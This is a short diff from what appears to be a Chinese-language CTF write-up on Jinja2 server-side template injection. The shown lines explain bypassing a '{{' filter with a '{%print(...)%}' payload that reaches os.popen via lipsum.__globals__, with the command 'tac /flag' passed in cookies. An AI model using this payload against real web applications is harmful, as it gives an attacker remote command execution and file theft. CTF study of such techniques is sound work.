@@ -352,7 +352,7 @@ Cookie传参：x1= __globals__;x2=os;x3=tac /flag
 通过`{百分号print(......)%}`替代`{{...}}`来绕过对`{{`的过滤
 
 ```
-{%print(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()%}
+{百分号print(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()%}
 
 Cookie传参：x1= __globals__;x2=os;x3=tac /flag
 ```
